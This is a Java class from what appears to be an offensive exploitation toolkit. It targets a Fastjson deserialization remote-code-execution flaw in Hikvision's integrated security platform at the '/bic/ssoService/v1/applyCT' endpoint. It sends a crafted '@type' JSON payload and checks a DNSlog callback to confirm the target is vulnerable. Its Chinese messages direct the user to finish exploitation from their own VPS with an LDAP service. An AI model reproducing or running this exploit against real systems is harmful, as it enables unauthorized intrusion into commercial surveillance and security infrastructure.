package Exp.equipment.HIKVISION;

import Utilss.HttpTools;
import Utilss.Response;
import Utilss.shell;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;

import java.util.HashMap;

public class hik_applyCT_fastjson implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        textArea.appendText("\n该漏洞使用dnslog检测 发包后延时5秒查看结果 测试时间略长(10s左右)");
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        textArea.appendText("\n 该漏洞不支持getshell  请自行开启ladp服务利用");
        return false;
    }

    private Boolean att(String url,TextArea textArea){
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "application/json");
        Response dns_le1 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
        int dns_1 = dns_le1.getText().length();

        String pay_1 = "{\"a\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"java.net.URL\",\"val\":\"" +
                shell.readFile(shell.dnspath) + "\"}}\"\"}";
        Response post = HttpTools.post(url + "/bic/ssoService/v1/applyCT", pay_1, head, "utf-8");

        try { Thread.sleep (5000) ;
        } catch (Exception ie){}

        Response dns_le2 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
        int dns_2 = dns_le2.getText().length();

        if(dns_2 > dns_1){
            textArea.appendText("\n漏洞存在-收到dnslog回显，请使用VPS自行利用");
            return true;
        }else {
            textArea.appendText("\n综合安防_applyCT_fastjson-RCE-漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }
}
